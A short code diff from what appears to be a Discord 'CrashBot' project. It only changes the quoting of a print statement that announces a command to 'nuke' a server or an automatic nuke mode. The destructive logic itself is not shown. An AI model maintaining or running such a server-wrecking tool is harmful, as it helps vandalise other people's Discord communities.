@@ -28,7 +28,7 @@ class CrashBot(Bot):
 
     async def on_ready(self):
         if environ["config"]["commands"]["command_for_kill"] and environ["config"]["commands"]["command"] != "":
-            print(f"[CDisTech] Wait for command {self.command_prefix}{environ["config"]["commands"]["command"]} for nuke server")
+            print(f"""[CDisTech] Wait for command {self.command_prefix}{environ["config"]["commands"]["command"]} for nuke server""")
         
         else:
             print("[CDisTec] Auto nuke has on")
